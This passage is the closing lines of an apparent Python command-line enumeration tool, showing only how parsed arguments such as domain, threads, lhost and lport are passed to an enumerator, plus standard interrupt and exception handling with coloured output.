            domain=args.domain,
            threads=args.threads,
            verbose=args.verbose,
            output_dir=args.output,
            aggressive=args.aggressive,
            lhost=args.lhost,
            lport=args.lport
        )
        enum.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
